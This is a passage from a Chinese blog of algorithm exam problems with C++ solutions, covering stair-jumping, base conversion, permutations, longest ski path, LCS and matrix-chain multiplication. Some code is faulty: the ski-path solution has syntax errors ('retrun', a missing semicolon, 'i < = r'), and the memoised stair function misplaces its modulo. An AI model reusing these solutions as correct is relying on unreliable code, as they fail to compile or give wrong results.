id="跳台阶-考试考了类似的"><a href="#跳台阶-考试考了类似的" class="headerlink" title="跳台阶(考试考了类似的)"></a>跳台阶(考试考了类似的)</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><h5 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h5><p>多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</p><h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h5><p>每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</p><p>所得到的结果模1000000007</p><h5 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h5 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> l=<span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">205</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">solve_1</span><span class="params">(<span class="keyword">int</span> n )</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span> <span class="keyword">long</span> count[<span class="number">205</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(count[n] != <span class="number">0</span> ) <span class="keyword">return</span> count[n];  <span class="comment">//这里有点像备忘录方法，不然直接递归这题会超时</span></span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">1</span> == n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">2</span> == n) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    count[n] = solve_1(n<span class="number">-1</span>)+solve_1(n<span class="number">-2</span>)%l;</span><br><span class="line">    <span class="keyword">return</span> count[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve_2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">2</span> ; i &lt;= n; i++)&#123;</span><br><span class="line">        dp[i] = (dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>])%l;   <span class="comment">//关键是这个递推式</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;solve_1(n)&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//递归</span></span><br><span class="line">        solve_2(n); <span class="comment">//动态规划</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进制转换-考试考了类似的"><a href="#进制转换-考试考了类似的" class="headerlink" title="进制转换(考试考了类似的)"></a>进制转换(考试考了类似的)</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>输入一个十进制正整数，然后输出它所对应的八进制数。</p><h5 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h5><p>输入一个十进制正整数n(1≤n≤106) 。</p><h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h5><p>输出n对应的八进制数，输出在一行。</p><h5 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><h5 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(num!=<span class="number">0</span>)&#123;</span><br><span class="line">tmp = num%<span class="number">8</span>;</span><br><span class="line">num = num/<span class="number">8</span>;</span><br><span class="line">s[i++] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;s[j];</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这个题目也可以用栈去模拟，几进制自己灵活变通*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">solve(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a>排列问题</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。</p><h5 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h5><p>单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。</p><h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h5><p>打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。</p><h5 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc,</span><br></pre></td></tr></table></figure><h5 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc acb bac bca cab cba</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lena<span class="number">-1</span>; i++ ) &#123; <span class="built_in">cout</span> &lt;&lt; a[i]; &#125; <span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span>; </span><br><span class="line">&#125; <span class="keyword">while</span>( next_permutation(a, a+lena<span class="number">-1</span>) );  <span class="comment">//关键是这个函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Perm</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">list</span>,<span class="keyword">int</span> k,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( k == m)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i &lt;= m; i++) <span class="built_in">cout</span>&lt;&lt;<span class="built_in">list</span>[i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=k; i&lt;=m; i++)&#123;</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);</span><br><span class="line">Perm(<span class="built_in">list</span>,k+<span class="number">1</span>,m);</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);  <span class="comment">//关键是换位之后记得还原现场</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line">a[lena<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">lena  = <span class="built_in">strlen</span>(a);</span><br><span class="line">sort(a,a+lena);</span><br><span class="line">Perm(a,<span class="number">0</span>,lena<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩形滑雪场"><a href="#矩形滑雪场" class="headerlink" title="矩形滑雪场"></a>矩形滑雪场</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。</p><h5 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h5><p>第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。</p><h5 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h5><p>仅一行:输出1个整数，表示可以滑行的最大长度。</p><h5 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">16 17 18 19 6</span><br><span class="line">15 24 25 20 7</span><br><span class="line">14 23 22 21 8</span><br><span class="line">13 12 11 10 9</span><br></pre></td></tr></table></figure><h5 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> record[<span class="number">105</span>][<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_x[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_y[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(record[x][y]) <span class="keyword">return</span> record[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> i&lt; <span class="number">4</span> ;i++)&#123;  <span class="comment">//往四个方向深搜</span></span><br><span class="line"><span class="keyword">int</span> wx = x+ m_x[i];</span><br><span class="line"><span class="keyword">int</span> wy = y+ m_y[i];</span><br><span class="line"><span class="keyword">if</span>(wx &gt;= <span class="number">1</span> &amp;&amp; wx &lt;= r &amp;&amp; wy &gt;=<span class="number">1</span> &amp;&amp; wy&lt;= c &amp;&amp; m[x][y] &gt; m[wx][wy])&#123;</span><br><span class="line">record[x][y] = max(record[x][y], dfs(wx,wy)+<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> record[x][y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;=r ;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j&lt;=c;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;m[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> result  =<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt; = r; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span> ; j&lt;=c;j++)&#123;</span><br><span class="line">record[i][j] = dfs(i,j);</span><br><span class="line">result = max(record[i][j],result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result + <span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>这种题目关键记住dp公式就好书上都有不多说</p><h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h3><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><h5 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><h5 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h5><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p><h5 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcfbc abfcab</span><br><span class="line">programming contest </span><br><span class="line">abcd mnp</span><br></pre></td></tr></table></figure><h5 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2</span><br><span class="line">0</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">2005</span>],b[<span class="number">2005</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*构造最优解*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCS</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i ==<span class="number">0</span>|| j==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i<span class="number">-1</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(m[i][j] == <span class="number">2</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">LCS(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> lena,<span class="keyword">int</span> lenb)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i &lt;=lena ;i++)&#123;</span><br><span class="line">c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line">c[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lena;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>]) &#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">m[i][j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i<span class="number">-1</span>][j] &gt;= c[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j];</span><br><span class="line">m[i][j] =<span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">c[i][j] = c[i][j<span class="number">-1</span>];</span><br><span class="line">m[i][j] = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c[lena][lenb]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//LCS(lena,lenb);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line"><span class="keyword">int</span> lenb = <span class="built_in">strlen</span>(b);</span><br><span class="line">solve(lena,lenb);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h3><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</p><h5 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h5><p>输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：<br>第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。<br>接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1 &lt; r, c<br>第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</p><h5 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h5><p>对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</p><p>数据保证结果不超过1e9。</p><h5 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h5 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7500</span><br><span 